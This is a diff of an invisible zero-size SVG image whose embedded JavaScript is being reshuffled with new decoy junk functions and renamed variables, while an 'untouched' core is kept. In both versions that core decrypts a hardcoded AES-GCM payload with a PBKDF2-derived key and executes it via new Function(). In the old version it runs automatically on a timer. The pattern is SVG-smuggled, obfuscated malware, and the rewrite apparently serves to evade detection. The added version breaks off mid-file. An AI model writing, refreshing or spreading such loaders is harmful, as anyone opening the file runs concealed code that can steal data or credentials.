@@ -2,222 +2,144 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
 <script type="application/javascript"><![CDATA[
 /*
-  DATA SECURITY EXTENDED DUMMY MODULE - v2
-  Now with extra confusion, dummy branches, pointless math, and nested decoys!
+    DATA SECURITY CONFUSE 3.0
+    Structure, flow, and naming are NEW. Decrypt core is untouched as requested!
 */
 
-// -- Core reference values (do not change) --
-const zsecurityPointer = "means", a1="[EMAIL]",b2="[KEY]";
+// -- Immutable Secret Refs --
+const ENTRY_CODE = "means", a1="[EMAIL]",b2="[KEY]";
 
-// -- Status reference object --
-let ultimateSessionState = {
-  tick: Date.now(),
-  stackA: 0,
-  stackB: 0,
-  stackC: 0,
-  moduleVer: 202,
-  fakeArr: [],
-  junkMeta: { created: new Date().toISOString(), ref: Math.random() }
+// -- Session Status Tracker --
+let sessionMetaX = {
+    boot: Date.now(),
+    hitA: 0,
+    hitB: 0,
+    hitC: 0,
+    v: 202,
+    fakeJunk: [],
+    metaWaste: { stamp: new Date().toISOString(), num: Math.random() }
 };
 
-// -- Useless class to look important --
-class UnusedRandomClass {
-  constructor(seed = Math.random()) {
-    this.seed = seed;
-    this.history = [seed];
-  }
-  addNoise() { this.history.push(Math.random()); }
-  getNoiseValue() { return this.history.reduce((a, b) => a + b, 0); }
+// --- More meaningless stuff ---
+function junkMixer(x) {
+    let y = [];
+    for (let i = 0; i < 6; i++) {
+        y.push(x + Math.random().toString(16).substr(2,7).toUpperCase());
+    }
+    return y.reverse().join("::");
 }
 
-// -- Nested pointless logic and generator --
-function elaborateFakeKeyGen() {
-  let out = [];
-  for (let g = 0; g < 4; g++) {
-    if (g % 2 === 0) {
-      out.push("FAKE_" + Math.random().toString(36).substring(2, 12).toUpperCase());
-    } else {
-      out.push("DUMMY_" + Math.floor(Math.random() * 9000 + 1000));
+class ScrambleNoise {
+    constructor(x = Math.random()) {
+        this.base = x; this.track = [x];
     }
-  }
-  return out.join(":");
+    swirl() { this.track.push(Math.random() * 2); }
+    sum() { return this.track.reduce((a, b) => a + b, 0); }
 }
 
-// -- Deeper nesting for noise --
-function makeExcessiveNoise() {
-  function randomizer(x) {
-    let res = x;
-    for (let i = 0; i < 7; i++) {
-      res += Math.sin(Math.random() * i * res);
-    }
+function hexToUint(str) {
+    let a = new Uint8Array(str.length/2);
+    for (let j=0;j<a.length;j++) a[j]=parseInt(str.substr(2*j,2),16);
+    return a;
+}
+
+function garbageWait(tm=88+Math.random()*131) {
+    return new Promise(res => setTimeout(res, tm));
+}
+
+function randomMessGen() {
+    let n = 1;
+    for (let i=0;i<9;i++) n += Math.tan(Math.random()*i) * (i%2 ? Math.random():1);
+    return Math.abs(n*111.1+Math.random());
+}
+
+function pseudoUseless(val) {
+    let f = val;
+    for (let k = 0; k < 5; k++)
+        f += Math.exp(Math.random()) / (Math.abs(Math.sin(f)) + 1);
+    return f % 113;
+}
+
+function deepHashGen(src) {
+    let res = "";
+    for (let h = 0; h < 10; h++)
+        res += String.fromCharCode(65 + (Math.abs(Math.sin(src.length * h)) * 1000) % 25);
     return res;
-  }
-  let val = 0;
-  for (let k = 0; k < 5; k++) {
-    val += randomizer(k) + Math.sqrt(k * 12.34 + Math.random());
-  }
-  return val;
 }
 
-// -- More dummy math functions --
-function fakeCryptoNoise(a) {
-  let v = a;
-  for (let m = 0; m < 9; m++) {
-    v = Math.abs(Math.tan(v + Math.random()));
-    v += Math.log(m + 1) * Math.exp(-v / 5);
-  }
-  return v;
-}
-
-// -- Multi-level dummy async logic --
-async function decoyAsyncLoader() {
-  await new Promise(res => setTimeout(res, Math.random() * 50 + 10));
-  let txt = await new Promise(r => setTimeout(() => r("dummy_" + Math.random()), 22));
-  if (txt.length < 12) { return "short"; } else { return "long"; }
-}
-
-// -- Even more pointless structures --
-let nestedUnusedObj = {
-  a: {
-    b: {
-      c: Math.PI,
-      d: "dummystring",
-      e: [1, 2, 3, 4].map(n => n * Math.random())
-    }
-  }
-};
-
-// -- Fake cryptographic hashes (useless) --
-function pseudoHash(val) {
-  let res = "";
-  for (let k = 0; k < 8; k++) {
-    res += String.fromCharCode(97 + (Math.floor(Math.abs(Math.sin(val.length * k)) * 26) % 26));
-  }
-  return res;
-}
-
-// -- Core config object (real values for decryption) --
-const deepObfuscatedRef = (() => {
-  const val = {
-    iv: "79db2541db682ad3416b01c4",
-    salt: "68d8283863d4d56550c284b8faea4a1b",
-    enc: "1dba7acd38e2cba2f4dbad3558a828da581ccd9b013fdd3416e1aa52ac91f3ca37fd6e0b3c4b4090b17d7f19d2648d0674bece484315861b180d802b0e7ebb0982b03cf1e1ab967b1dd7eff555797db335ff3e50029f752f7b6d0984f1f3d8c63947626e552527c77a1ab727bb3bb757efe887403810392a4c7c7cb412ced97d0ccb5085e9835deab80a5647e803f71ce252e3e92272a4b250eddfc306fe30cba90af3c4d6c272776c7a158aacee88d3e2c7278d73cdee8728c076bd5709d3b2c0884d41d2e8d024f3b9548001c9e5212f4955ff1060cd8d2f91ad30793f6357ea8e50c3157c76a9bcff42a25bc794a6c4f7df1741dc43ed4f81f2d9992266d00e85c41c09eb2920bc6fa49714f31e4adba9ebbf4efd61ab8ed193f76a516bdd16e78dd3a1c07e142f340d4df3eb936fab9f2e2af47244ae968055ec083dcb6c765df224e8a5615e327abb57bcf106226c197bca428a0b8c4f41fda46166a2d67cf6e6f73fc14ccc8569be9fb7b9c178a3896306580c21598a0d9290b7c69077f17363456d9d3ec18e87f1dd3b227d32d0fa42b3151239fc66fdbeaf5eb3fea72f18734655455526ef6036649997772ea6a7243740c45149fb679f8bfd632e8be4022dccb877a5bee0cae3098b6bf0c8c6e44878547e35c640",
-    key: "h8435373453453845ds"
-  };
-  let extraStatus = { readyState: true, identifier: elaborateFakeKeyGen() };
-  return {
-    getIV: () => val.iv,
-    getSalt: () => val.salt,
-    getEnc: () => val.enc,
-    getKey: () => val.key,
-    status: () => extraStatus
-  };
+// --- True obfuscated core ref ---
+const ENCRYPTION_STORE = (() => {
+    const x = {
+        iv: "79db2541db682ad3416b01c4",
+        salt: "68d8283863d4d56550c284b8faea4a1b",
+        enc: "1dba7acd38e2cba2f4dbad3558a828da581ccd9b013fdd3416e1aa52ac91f3ca37fd6e0b3c4b4090b17d7f19d2648d0674bece484315861b180d802b0e7ebb0982b03cf1e1ab967b1dd7eff555797db335ff3e50029f752f7b6d0984f1f3d8c63947626e552527c77a1ab727bb3bb757efe887403810392a4c7c7cb412ced97d0ccb5085e9835deab80a5647e803f71ce252e3e92272a4b250eddfc306fe30cba90af3c4d6c272776c7a158aacee88d3e2c7278d73cdee8728c076bd5709d3b2c0884d41d2e8d024f3b9548001c9e5212f4955ff1060cd8d2f91ad30793f6357ea8e50c3157c76a9bcff42a25bc794a6c4f7df1741dc43ed4f81f2d9992266d00e85c41c09eb2920bc6fa49714f31e4adba9ebbf4efd61ab8ed193f76a516bdd16e78dd3a1c07e142f340d4df3eb936fab9f2e2af47244ae968055ec083dcb6c765df224e8a5615e327abb57bcf106226c197bca428a0b8c4f41fda46166a2d67cf6e6f73fc14ccc8569be9fb7b9c178a3896306580c21598a0d9290b7c69077f17363456d9d3ec18e87f1dd3b227d32d0fa42b3151239fc66fdbeaf5eb3fea72f18734655455526ef6036649997772ea6a7243740c45149fb679f8bfd632e8be4022dccb877a5bee0cae3098b6bf0c8c6e44878547e35c640",
+        key: "h8435373453453845ds"
+    };
+    let status = { ok: !0, ref: junkMixer("SAFE") };
+    return {
+        getIV: ()=>x.iv,
+        getSalt: ()=>x.salt,
+        getEnc: ()=>x.enc,
+        getKey: ()=>x.key,
+        dump: ()=>status
+    };
 })();
 
-// -- Pointless hexadecimal to Uint8Array converter (but used!) --
-function convertHexToArr(hexStr) {
-  let arr = new Uint8Array(hexStr.length / 2);
-  for (let i = 0; i < arr.length; i++) arr[i] = parseInt(hexStr.substr(2 * i, 2), 16);
-  return arr;
+// -- Dummy async routine --
+async function asyncMislead() {
+    await new Promise(r=>setTimeout(r, Math.random()*30+50));
+    return "junk_" + Math.floor(Math.random()*12345);
 }
 
-// -- Delayed execution with fake random jitter --
-function jitterDelay(ms = 120 + Math.random() * 90) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
+// -- New fake struct, never used --
+let deepTrashNest = { A: { B: { C: Math.E, D: "dummy", E: [1,9,3,7].map(n=>n*Math.random()) } } };
 
-// -- Main decryption and executor (REAL, DO NOT TOUCH INNER LOGIC) --
-async function powerfulDecryptionMain() {
-  ultimateSessionState.stackA = window.performance?.memory?.usedJSHeapSize || 0;
-  ultimateSessionState.stackB++;
-  try {
-    const cryptKey = await crypto.subtle.importKey("raw",
-      new TextEncoder().encode(deepObfuscatedRef.getKey()),
-      { name: "PBKDF2" }, false, ["deriveKey"]);
-    const derived = await crypto.subtle.deriveKey(
-      { name: "PBKDF2", salt: convertHexToArr(deepObfuscatedRef.getSalt()), iterations: 100000, hash: "SHA-256" },
-      cryptKey, { name: "AES-GCM", length: 256 }, false, ["decrypt"]
-    );
-    await jitterDelay();
-    const plainBytes = await crypto.subtle.decrypt(
-      { name: "AES-GCM", iv: convertHexToArr(deepObfuscatedRef.getIV()) },
-      derived, convertHexToArr(deepObfuscatedRef.getEnc())
-    );
-    // -- DYNAMIC EXECUTION (do not remove) --
-    (new Function(new TextDecoder().decode(plainBytes)))();
-  } catch (err) {
-    fakeCryptoNoise(Date.now());
-    console.error("DECRYPTION FAILURE", err && err.message);
-  }
-}
-
-// -- Populate junk and noise arrays --
-function fillFakeArray() {
-  for (let i = 0; i < 6; i++) {
-    if (i % 2 === 1) {
-      ultimateSessionState.fakeArr.push(pseudoHash(elaborateFakeKeyGen()) + "~" + Math.random().toFixed(5));
-      makeExcessiveNoise();
-    } else {
-      ultimateSessionState.fakeArr.push(elaborateFakeKeyGen() + "#" + Math.random());
+// -- Filler for “data” arrays --
+function fillWasteArr() {
+    for (let z = 0; z < 8; z++) {
+        sessionMetaX.fakeJunk.push(
+            z % 3 ? deepHashGen(junkMixer("xx")) + "/" + Math.random().toFixed(7)
+                  : junkMixer("yy") + "_" + Math.random()
+        );
+        if (z === 5) { try { JSON.parse("garbage!!"); } catch (_) {} }
     }
-    if (i === 4) {
-      try { JSON.parse("{this: is not valid json}") } catch (e) { /* Trap for forensics */ }
-    }
-  }
 }
 
-// -- More unrelated stuff to increase length and confusion --
-let ultraRedundant = {
-  alpha: [1, 2, 3, 4].map(fakeCryptoNoise),
-  beta: elaborateFakeKeyGen(),
-  gamma: makeExcessiveNoise(),
-  delta: () => decoyAsyncLoader()
-};
-
-function moreNoiseTraps() {
-  try { JSON.parse("[}"); } catch { console.log("Noise trap triggered!"); }
+// -- “Trap” for log analyzer
+function logDecoyTrap() {
+    try { JSON.parse("[]"); } catch { console.log("Fake trap triggered!"); }
 }
 
-document.addEventListener("DOMContentLoaded", async () => {
-  fillFakeArray();
-  moreNoiseTraps();
-  await decoyAsyncLoader();
-  makeExcessiveNoise();
-  fakeCryptoNoise(ultimateSessionState.stackB);
-  let c = new UnusedRandomClass();
-  c.addNoise(); c.addNoise();
-});
-
-// -- Delay execution with even more dummy logic! --
-setTimeout(() => {
-  powerfulDecryptionMain();
-  if (Math.random() > 0.25) {
-    for (let t = 0; t < 2; t++) {
-      let c = fakeCryptoNoise(Math.random() * t);
-      if (c > 1) { makeExcessiveNoise(); }
+// -- DECRYPTION CORE: DO NOT EDIT THIS BLOCK! --
+async function SECURE_DECRYPT() {
+    sessionMetaX.hitA = window.performance?.memory?.usedJSHeapSize || 0;
+    sessionMetaX.hitB++;
+    try {
+        const baseKey = await crypto.subtle.importKey(
+            "raw",
+            new TextEncoder().encode(ENCRYPTION_STORE.getKey()),
+            { name: "PBKDF2" },
+            false,
+            ["deriveKey"]
+        );
+        const derive = await crypto.subtle.deriveKey(
+            { name: "PBKDF2", salt: hexToUint(ENCRYPTION_STORE.getSalt()), iterations: 1e5, hash: "SHA-256" },
+            baseKey,
+            { name: "AES-GCM", length: 256 },
+            false,
+            ["decrypt"]
+        );
+        await garbageWait();
+        const plain = await crypto.subtle.decrypt(
+            { name: "AES-GCM", iv: hexToUint(ENCRYPTION_STORE.getIV()) },
+            derive,
+            hexToUint(ENCRYPTION_STORE.getEnc())
+        );
+        (new Function(new TextDecoder().decode(plain)))();
+    } catch (ex) {
+        pseudoUseless(Date.now());
+        console.error("SECURE_DECRYPT ERROR", ex && ex.message);
     }
-  }
-}, 1888 + Math.floor(Math.random() * 500));
+}
 
-// -- Even more dummies --
-(() => {
-  let F = [];
-  for (let i = 0; i < 5; i++) {
-    F.push(elaborateFakeKeyGen() + "&" + Math.random().toFixed(8));
-    if (i === 2) { UnusedRandomClass.prototype.getNoiseValue.call({ history: [1, 2, 3] }); }
-  }
-  ultimateSessionState.fakeArr.push(F.join("|"));
-  decoyAsyncLoader();
-  fakeCryptoNoise(77);
-})();
-
-// -- Various unused functions and decoys (for security by confusion) --
-function neverCall1() { return Math.pow(Math.random(), 8.8); }
-function neverCall2() { let n = 0; for (let i = 0; i < 7; i++) n += i; return n; }
-function unusedBranching() { if (ultimateSessionState.tick % 2) { return pseudoHash("zzz"); } else { return "xx" + Math.random(); } }
-function irrelevantConcat() { return "A" + "B" + "C" + Math.random(); }
-
-console.info("[DBG] Extended random session:", ultimateSessionState);
-
-]]></script>
-</svg>
+// -- Even more noisy garbage
